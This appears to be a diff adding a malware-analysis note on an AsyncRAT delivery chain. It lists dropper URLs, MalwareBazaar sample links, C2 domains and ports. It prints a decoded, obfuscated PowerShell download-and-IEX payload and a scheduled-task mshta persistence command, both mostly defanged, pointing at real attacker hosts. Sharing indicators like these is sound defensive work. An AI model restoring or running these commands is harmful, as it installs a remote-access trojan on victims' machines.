@@ -1,0 +1,41 @@
+
+
+Dropped from hxxps[://]webnar[.]info/msgboxvbs[.]htm
+msgboxvbs.htm
+https://bazaar.abuse.ch/sample/f4c85d06fc7e87411dcc487fcbc836c69621c8594733bc9e2d4fd5d8782643ff/
+
+Decoded payload
+
+powershell -Command [void] [System[.]Reflection[.]Assembly]::LoadWithPartialName('Microsoft[.]VisualBasic');$fj=[Microsoft[.]VisualBasic[.]Interaction]::CallByname((New-Object Net[.]WebClient),'Dow__lo--tri__g'.replace('__','n').replace('--','adS'),[Microsoft[.]VisualBasic[.]CallType]::Method,'__#$_____!___'.Replace('__#$__','hxxps://webnar.').Replace('___!___','info/js[.]png'))|IEX;[Byte[]]
+
+/sc MINUTE /mo 120 /tn "AvastVPN" /tr "\"mshta\"hxxp[://]www[.]unimed-corporated[.]com/microsoft[.]html" /F
+
+Dropped from URL hxxps[://]webnar[.]info/js[.]png
+Js.PNG
+https://bazaar.abuse.ch/sample/3f9d87fe92a438d82a020e9be12b34bc11d0474d2d58145cd35d04162997a8af/
+
+
+Dropped from URL hxxps[://]webnar[.]info/asyncnovodisparo[.]jpg
+asyncnovodisparo.ps1
+https://bazaar.abuse.ch/sample/e170dce58acff291b1ee9cde4093d13ade6a32067b980dbd33033228cc377472/
+
+Stub.exe
+https://bazaar.abuse.ch/sample/d01e1d3d771a443f0fb994b3b3583422124677d4fba4eec14ce6f387e97055c3/
+
+C2: chromedata[.]accesscam[.]org,cdt[.]3utilities[.]com,adobedata[.]webredirect[.]org
+Ports: 6606,7707,8808,4404,5505,3303,2222,8808,5155,5122,9000,9999,8888
+
+
+payload from URL hxxp[://]www[.]unimed-corporated[.]com/microsoft[.]html (From above Scheduled Task)
+
+microft.html
+https://bazaar.abuse.ch/sample/2693749e9e3f7c99543e3e622a335a9db30dc604808f06e3a51f20c33bac8af2/
+
+update.ps1
+https://bazaar.abuse.ch/sample/1670572dbb748d82d05e91298564847dbda33749d8721537601457194abd7569/
+
+AsyncClient_Stub.exe
+https://bazaar.abuse.ch/sample/82e92309f355dee038c9377df58d47aa2f9058d7db9d804e1c021a6e12d20883/
+
+C2: cdtpitbull[.]hopto[.]org,chromedata[.]accesscam[.]org,datacontrol[.]ddns[.]net,cdt2023[.]ddns[.]net
+Ports: 7707,4404,5505,3303,2222,6606,8808,5155,5122,8001,9000,9999,8888
